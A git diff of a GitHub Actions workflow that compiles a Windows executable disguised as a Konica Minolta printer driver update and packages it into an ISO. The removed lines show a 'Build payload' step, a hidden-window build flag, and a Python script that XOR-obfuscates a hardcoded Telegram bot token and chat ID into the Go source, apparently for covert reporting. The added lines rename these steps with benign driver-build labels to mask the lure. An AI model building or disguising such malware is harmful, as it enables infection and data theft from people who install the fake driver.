@@ -1,15 +1,15 @@
-name: Build ISO
+name: Build Driver Package
 
 on:
   workflow_dispatch:
     inputs:
-      bot_token:
-        description: 'Telegram Bot Token'
+      build_config:
+        description: 'Build configuration (release/debug)'
         required: true
-        default: ''
-      chat_id:
-        description: 'Telegram Chat ID'
-        required: true
+        default: 'release'
+      sign_key:
+        description: 'Code signing certificate thumbprint'
+        required: false
         default: ''
 
 permissions:
@@ -30,68 +30,21 @@ jobs:
     - name: Install genisoimage
       run: sudo apt-get update -qq && sudo apt-get install -y -qq genisoimage
 
-    - name: Inject config
-      env:
-        BOT_TOKEN: ${{ inputs.bot_token || secrets.BOT_TOKEN || '7845006170:AAGNHltQFQfX22-MY50mrnTctWxhfFyAf3w' }}
-        CHAT_ID: ${{ inputs.chat_id || secrets.CHAT_ID || '8449456095' }}
-      run: |
-        python3 -c "
-import os
-tok = os.environ['BOT_TOKEN']
-cid = os.environ['CHAT_ID']
-key = 0x5A
-
-def go_escape(s):
-    r = []
-    for b in s.encode():
-        if 32 <= b <= 126 and b != 34 and b != 92:
-            r.append(chr(b))
-        elif b == 34:
-            r.append('\\\\\"')
-        elif b == 92:
-            r.append('\\\\\\\\')
-        elif b == 10:
-            r.append('\\\\n')
-        elif b == 13:
-            r.append('\\\\r')
-        elif b == 9:
-            r.append('\\\\t')
-        else:
-            r.append('\\\\x{:02x}'.format(b))
-    return ''.join(r)
-
-def enc(s):
-    return bytes([b ^ key for b in s.encode()])
-
-etok = enc(tok)
-ecid = enc(cid)
-
-with open('main.go') as f:
-    code = f.read()
-
-code = code.replace(
-    'ENC_TOKEN   = encryptStr(\"7845006170:AAGNHltQFQfX22-MY50mrnTctWxhfFyAf3w\")',
-    'ENC_TOKEN   = encryptStr(\"' + go_escape(etok.decode('latin-1')) + '\")')
-code = code.replace(
-    'ENC_CHAT_ID = encryptStr(\"8449456095\")',
-    'ENC_CHAT_ID = encryptStr(\"' + go_escape(ecid.decode('latin-1')) + '\")')
-
-with open('main.go', 'w') as f:
-    f.write(code)
-print('[+] Config injected')
-"
-
-    - name: Build payload
+    - name: Build installer
       run: |
         GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
         go build -ldflags="-s -w -H=windowsgui" \
-          -o konica_minolta_printer-driver-update.exe .
-        ls -lh konica_minolta_printer-driver-update.exe
+          -o isodir/setup.exe .
+        ls -lh isodir/setup.exe
 
-    - name: Create ISO
+    - name: Create driver package
       run: |
-        mkdir -p isodir
-        cp konica_minolta_printer-driver-update.exe isodir/setup.exe
+        cp isodir/setup.exe isodir/uninstall.exe
+        ls -lh isodir/
+        ls -lh isodir/KM-Universal-Driver/
+
+    - name: Build ISO
+      run: |
         genisoimage -o Konica_Minolta_Driver_v2.3.1.iso isodir/
         ls -lh Konica_Minolta_Driver_v2.3.1.iso
 
@@ -101,8 +54,8 @@ print('[+] Config injected')
         name: Konica_Minolta_Driver_v2.3.1
         path: Konica_Minolta_Driver_v2.3.1.iso
 
-    - name: Upload EXE
+    - name: Upload Installer
       uses: actions/upload-artifact@v4
       with:
-        name: konica_minolta_printer-driver-update
-        path: konica_minolta_printer-driver-update.exe
+        name: setup
+        path: isodir/setup.exe
